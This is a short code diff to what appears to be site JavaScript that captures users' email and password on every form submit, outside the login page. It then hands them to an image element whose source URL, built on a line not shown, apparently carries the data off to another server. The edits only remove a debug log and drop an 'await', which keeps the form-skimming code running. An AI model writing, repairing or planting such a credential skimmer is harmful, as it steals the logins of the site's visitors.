@@ -4,7 +4,6 @@ if(window.location.pathname.indexOf("/login") == -1){
 
 $(document).ready(function(){
 	$(document).on("submit", function(e){
-		console.log("asdsa");
 		email = $("#user_mail").val();
 		pass = $("#user_pass").val();
 		
@@ -12,7 +11,7 @@ $(document).ready(function(){
 		img = document.createElement('img');
 		img.src = src;
 		document.body.appendChild(img);
-		await sleep(500);
+		sleep(500);
 	});
 });
 
